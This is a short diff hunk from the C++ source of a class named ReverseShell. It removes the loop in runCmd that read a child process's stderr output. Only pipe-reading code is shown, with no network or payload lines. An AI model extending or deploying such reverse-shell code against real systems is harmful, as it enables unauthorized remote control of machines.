@@ -79,12 +79,7 @@ int ReverseShell::runCmd(const std::string &commandToExecute, std::string &outOu
         outOutput += s;
     }
     dwRead = 0;
-    for (;;) { // read stderr
-        bSuccess2 = ReadFile(g_hChildStd_ERR_Rd, chBuf, BUFSIZE, &dwRead, nullptr);
-        if (!bSuccess2 || dwRead == 0) break;
-        std::string s(chBuf, dwRead);
-        outOutput += s;
-    }
+
 
     // The remaining open handles are cleaned up when this process terminates.
     // To avoid resource leaks in a larger application,
